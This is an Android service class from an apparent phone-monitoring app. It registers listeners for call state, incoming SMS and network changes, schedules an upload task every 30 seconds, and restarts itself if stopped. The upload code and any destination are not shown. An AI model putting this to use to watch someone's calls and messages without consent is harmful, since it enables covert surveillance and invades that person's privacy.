package com.monitor.phone.s0ft.phonemonitor;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

import java.util.Timer;


public class MainService extends Service {

    private static CallStateBroadcastReceiver callStateBroadcastReceiver;
    private static SMSBroadcastReceiver smsBroadcastReceiver;
    private static NetworkChangeBroadcastReceiver networkChangeBroadcastReceiver;
    private static final double UPLOAD_INTERVAL = 0.5;//in minutes


    @Override
    public void onCreate() {

        /*Setup the phone call broadcast receiver*/
        callStateBroadcastReceiver = new CallStateBroadcastReceiver();
        IntentFilter intentFilterPhonestate = new IntentFilter();
        intentFilterPhonestate.addAction("android.intent.action.PHONE_STATE");
        registerReceiver(callStateBroadcastReceiver, intentFilterPhonestate);

        /*Setup the sms broadcast receiver*/
        smsBroadcastReceiver = new SMSBroadcastReceiver();
        IntentFilter intentFilterSmsreceived = new IntentFilter();
        intentFilterSmsreceived.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsBroadcastReceiver, intentFilterSmsreceived);

        /*Setup the connectivity broadcast receiver*/
        networkChangeBroadcastReceiver = new NetworkChangeBroadcastReceiver();
        IntentFilter intentFilterNetworkChanged = new IntentFilter();
        intentFilterNetworkChanged.addAction("android.net.conn.CONNECTIVITY_CHANGE");
        registerReceiver(networkChangeBroadcastReceiver, intentFilterNetworkChanged);

        /*Fire up the RepeatTask class in a timer*/
        RepeatTask repeatTask = new RepeatTask(this);
        try {
            new Timer().scheduleAtFixedRate(repeatTask, 0, (long) (UPLOAD_INTERVAL * 60 * 1000));
        } catch (IllegalStateException ise) {
            Log.w(AppSettings.getTAG(), ise.getMessage());
        }


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        unregisterReceiver(callStateBroadcastReceiver);
        unregisterReceiver(smsBroadcastReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
